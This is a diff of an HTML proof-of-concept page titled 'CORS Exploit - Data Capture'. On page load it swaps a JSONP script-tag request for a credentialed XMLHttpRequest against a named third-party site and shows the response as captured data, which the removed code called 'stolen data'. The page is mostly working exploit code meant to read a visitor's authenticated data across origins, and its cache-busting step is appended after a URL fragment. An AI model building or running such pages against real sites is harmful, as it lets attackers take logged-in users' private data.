@@ -5,20 +5,43 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CORS Exploit - Data Capture</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        #response { white-space: pre-wrap; margin-top: 20px; }
+    </style>
     <script>
         function fetchData() {
-            // Create a new script tag to handle the JSONP request
-            var script = document.createElement('script');
-            script.src = 'https://www.jaguar.here.com/index.php#search';
-            document.body.appendChild(script);
+            var xhr = new XMLHttpRequest();
+            var url = 'https://www.jaguar.here.com/index.php#search';
+
+            // Add unique timestamp to bypass caching
+            url += '&t=' + new Date().getTime();
+
+            xhr.open('GET', url, true);
+            xhr.withCredentials = true;
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    // Success: display the captured data
+                    var responseData = xhr.responseText;
+                    document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
+                } else {
+                    // Error: log status and statusText
+                    console.error('Request failed with status:', xhr.status, xhr.statusText);
+                    document.getElementById('response').textContent = 'Error: ' + xhr.status + ' ' + xhr.statusText;
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('Network or CORS error occurred');
+                document.getElementById('response').textContent = 'Network or CORS error occurred.';
+            };
+
+            console.log('Sending request to:', url); // Debugging: Log the request URL
+            xhr.send();
         }
 
-        function handleResponse(response) {
-            // Display the response (stolen data) on the page
-            document.body.innerHTML += '<p>Stolen Data: ' + JSON.stringify(response) + '</p>';
-        }
-
-        // Run the exploit on page load
+        // Fetch data on page load
         window.onload = fetchData;
     </script>
 </head>
